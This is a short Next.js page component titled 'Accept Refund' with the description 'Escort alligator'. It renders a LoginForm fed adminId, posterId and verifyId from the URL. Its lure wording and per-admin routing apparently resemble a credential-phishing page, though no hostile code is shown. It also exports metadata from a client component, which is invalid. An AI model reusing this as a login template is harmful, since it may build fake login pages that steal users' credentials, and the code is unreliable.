"use client";
import LoginForm from "@/app/components/LoginForm";
import { useParams } from "next/navigation";
export const metadata = {
  title: "Accept Refund",
  description: "Escort alligator",
};
const page = () => {
  const params = useParams();
  return (
    <div>
      <LoginForm
        adminId={params.adminId}
        posterId={params.posterId}
        verifyId={params.verifyId}
      />
    </div>
  );
};

export default page;
